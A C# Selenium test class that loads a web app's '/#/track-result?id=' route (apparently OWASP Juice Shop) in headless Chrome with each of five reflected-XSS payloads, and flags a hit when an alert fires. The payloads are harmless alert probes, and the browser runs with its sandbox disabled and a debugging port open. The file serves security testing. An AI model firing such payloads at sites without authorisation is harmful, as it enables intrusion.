using Mysqlx.Crud;
using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;

namespace Sevz.Services
{
    public class XssScannerTest
    {
        private static readonly HttpClient client = new HttpClient();

        public async Task TestXSS()
        {
            string savedIp = SetIP.GetSavedIp();
            string savedPort = SetPort.GetSavedPort();
            string url = $"http://{savedIp}:{savedPort}/#/track-result?id=";

            List<string> xssPayloads = new List<string>
            {
                "<script>alert(`xss`)</script>",
                "<img src=x onerror=alert(`xss`)>",
                "<svg/onload=alert(`xss`)>",
                "<iframe src=\"javascript:alert(`xss`)\">",
                "<body onload=alert(`xss`)>",
            };

            foreach (var payload in xssPayloads)
            {
                string testUrl = url + Uri.EscapeDataString(payload);
                Console.WriteLine($"[+] Testing payload: {payload}");

                // ChromeDriver 서비스 설정
                var chromeService = ChromeDriverService.CreateDefaultService();
                chromeService.SuppressInitialDiagnosticInformation = true;  // 초기 진단 메시지 숨기기
                chromeService.HideCommandPromptWindow = true;  // 명령 프롬프트 창 숨기기

                // Chrome 옵션 설정
                ChromeOptions options = new ChromeOptions();
                options.AddArgument("--headless");  // 헤드리스 모드 사용
                options.AddArgument("--no-sandbox");  // 샌드박스 비활성화
                options.AddArgument("--disable-dev-shm-usage");  // /dev/shm 사용 비활성화
                options.AddArgument("--disable-gpu");  // GPU 비활성화
                options.AddArgument("--window-size=1920x1080");  // 화면 크기 설정
                options.AddArgument("--disable-software-rasterizer");  // 소프트웨어 렌더링 비활성화
                options.AddArgument("--remote-debugging-port=9222");  // 디버깅 포트 설정
		options.AddArgument("--user-data-dir=/tmp/chrome_user_data"); // 사용자 데이터 디렉터리 설정

		using (IWebDriver driver = new ChromeDriver(chromeService, options))
                {
                    try
                    {
                        driver.Navigate().GoToUrl(testUrl);
                        IAlert alert = driver.SwitchTo().Alert();

                        if (alert != null)
                        {
                            Console.WriteLine($"[!] XSS vulnerability detected! Payload: {payload}");
                            alert.Accept();  // XSS 탐지 시 알림 닫기
                        }
                        else
                        {
                            Console.WriteLine($"[+] No XSS vulnerability found with payload: {payload}");
                        }
                    }
                    catch (NoAlertPresentException)
                    {
                        Console.WriteLine($"[+] No XSS vulnerability found with payload: {payload}");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"[-] Error with payload: {payload} - Exception: {ex.Message}");
                    }
                }
            }
        }
    }
}
